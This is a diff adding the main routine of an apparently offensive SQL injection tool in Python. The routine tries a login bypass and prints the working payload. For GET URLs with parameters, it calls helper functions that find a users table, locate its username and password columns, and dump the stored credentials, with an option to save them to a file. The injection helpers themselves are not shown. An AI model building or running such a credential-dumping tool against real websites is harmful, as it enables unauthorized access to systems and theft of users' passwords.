@@ -142,6 +142,62 @@ def main():
         -m METHOD     Enter request method
         -d DATA       Enter your post data''')
 
-    
+    if not arged:
+        help()
+    method= args.method
+    output = args.file
+    url = args.url
+    data = args.post_data
+
+    method = 'GET' if not args.method else 'POST'
+    if method.upper() == 'POST' and data is None:
+        print("Please provide POST data for the selected method.")
+        sys.exit(1)
+
+
+
+
+    if method == 'POST':
+        try_login_option = True
+        print("\n")
+        if data is None:
+            print("Please enter post data)\n")
+        try:
+                post_data = {key: value for key, value in (item.split('=') for item in data.split('&'))}
+                if not('username' in post_data and 'password' in post_data):
+                    return False
+                                
+        except:
+                print("Incorrect Post format (e.g username=user&password=pass)\n")
+                return           
+        if try_login_option:  
+            login_successful = try_login(url, method, post_data)
+            if login_successful[0]:
+                print("[+] Login Successful!")
+                print(f"[+] Payload = {login_successful[1]}")
+            else:
+                print("[-] Login Failed. Stopping execution.")
+                sys.exit(1)
+        else:
+            print("[-] Please select try login option.")
+            sys.exit(1)
+
+    if method.upper() == 'GET':
+        if has_parameters(url):
+            users_table, num_col, string_column = exploit_sqli_users_table(url, method)
+            if users_table:
+                print("Found the users table")
+                print(f"Users Table: {users_table}")
+                username_column, password_column = exploit_sqli_users_columns(url, users_table, method, num_col, string_column)
+                if username_column and password_column:
+                    print(f"Username Column: {username_column}")
+                    print(f"Password Column: {password_column}")
+                    user_cred = exploit_sqli_user_cred(url, users_table, username_column, password_column, method)
+                    if user_cred:
+                        print("[+] The username and password are as below: \n")
+                        for value in user_cred:
+                            print("[+] %s\n" % value)
+                    if output:
+                        save_to_file(user_cred)
 if __name__ == '__main__':
     main()
